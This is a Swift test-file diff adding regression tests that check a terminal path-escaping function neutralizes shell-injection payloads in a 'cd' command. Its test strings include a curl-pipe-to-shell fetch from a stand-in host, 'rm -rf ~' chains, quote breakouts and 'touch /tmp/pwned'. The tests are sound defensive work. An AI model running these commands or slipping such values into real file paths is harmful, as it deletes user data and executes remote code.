@@ -10,6 +10,79 @@ public struct CopyPathTests {
 
         testFormattingVariants(baseDir: baseDir, targetFile: targetFile)
         testRelativePathAndCopy(baseDir: baseDir, targetFile: targetFile)
+        testShellInjectionPayloadsNeutralized()
+    }
+
+    /// Regression coverage for the IntegratedTerminalView shell-injection fix: both `cd "<path>"`
+    /// call sites now route the path through `escapeForTerminal` before interpolating it into a
+    /// double-quoted shell string. The PTY send sites themselves aren't unit-testable (they need
+    /// a live SwiftTerm/NSViewRepresentable), but the actual security property — that
+    /// `escapeForTerminal` neutralizes command-injection payloads when embedded in `cd "..."` —
+    /// is fully testable here.
+    private static func testShellInjectionPayloadsNeutralized() {
+        // Command substitution via $(...)
+        let cmdSubst = "$(curl evil.sh|sh)"
+        assertNeutralizedWhenQuoted(cmdSubst, description: "$(...) command substitution")
+
+        // Command substitution via backticks
+        let backticks = "`rm -rf ~`"
+        assertNeutralizedWhenQuoted(backticks, description: "backtick command substitution")
+
+        // Attempted double-quote breakout followed by a chained destructive command
+        let quoteBreakout = "\"; rm -rf ~; echo \""
+        assertNeutralizedWhenQuoted(quoteBreakout, description: "double-quote breakout with chained command")
+
+        // Attempted quote breakout via an escaped double quote plus a comment to swallow the rest
+        let escapedQuoteBreakout = "\\\"; touch /tmp/pwned #"
+        assertNeutralizedWhenQuoted(escapedQuoteBreakout, description: "backslash+quote breakout with trailing comment")
+
+        // Semicolon-chained command with no quotes at all
+        let chained = "; touch /tmp/pwned ;"
+        assertNeutralizedWhenQuoted(chained, description: "semicolon-chained command")
+
+        // Sanity: an ordinary path is left semantically intact (still equal once unescaped)
+        let benign = "/Users/test/Documents/My Folder"
+        let benignEscaped = CopyPathService.escapeForTerminal(benign)
+        TestReporter.report(
+            "CopyPath",
+            "POS: escapeForTerminal leaves a benign path's characters intact aside from added escapes",
+            result: benignEscaped.replacingOccurrences(of: "\\", with: "") == benign
+        )
+    }
+
+    /// Simulates the real call site (`cd "\(escapeForTerminal(path))"`) and asserts the resulting
+    /// double-quoted shell string contains no unescaped `"`, `$`, or backtick that could break out
+    /// of the quotes or trigger command/variable substitution.
+    private static func assertNeutralizedWhenQuoted(_ payload: String, description: String) {
+        let escaped = CopyPathService.escapeForTerminal(payload)
+        let shellCommand = "cd \"\(escaped)\""
+
+        // Walk the command string; every `"`, `$`, or backtick found must be immediately
+        // preceded by a backslash, EXCEPT the two literal quotes we added to open/close the cd
+        // argument.
+        var passed = true
+        let chars = Array(shellCommand)
+        var quoteCount = 0
+        for (index, char) in chars.enumerated() {
+            guard char == "\"" || char == "$" || char == "`" else { continue }
+            let escapedByPriorBackslash = index > 0 && chars[index - 1] == "\\"
+            if char == "\"" {
+                quoteCount += 1
+                // The 1st and last quote in the whole command are the ones we deliberately added.
+                let isDeliberateBoundaryQuote = (quoteCount == 1) || (index == chars.count - 1)
+                if !isDeliberateBoundaryQuote && !escapedByPriorBackslash {
+                    passed = false
+                }
+            } else if !escapedByPriorBackslash {
+                passed = false
+            }
+        }
+
+        TestReporter.report(
+            "CopyPath",
+            "NEG: escapeForTerminal neutralizes injection payload when embedded in cd \"...\" (\(description))",
+            result: passed
+        )
     }
 
     private static func testFormattingVariants(baseDir: URL, targetFile: URL) {
@@ -79,7 +152,7 @@ public struct CopyPathTests {
         )
 
         // POS: copy() with multiple URLs joins the formatted paths with newlines
-        let tempDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent(UUID().uuidString)
+        let tempDir = URL(fileURLWithPath: testTemporaryDirectory()).appendingPathComponent(UUID().uuidString)
         let secondFile = tempDir.appendingPathComponent("second file.txt")
         CopyPathService.copy(urls: [targetFile, secondFile], variant: .absolute)
         let expectedMulti = [targetFile.standardizedFileURL.path, secondFile.standardizedFileURL.path].joined(separator: "\n")
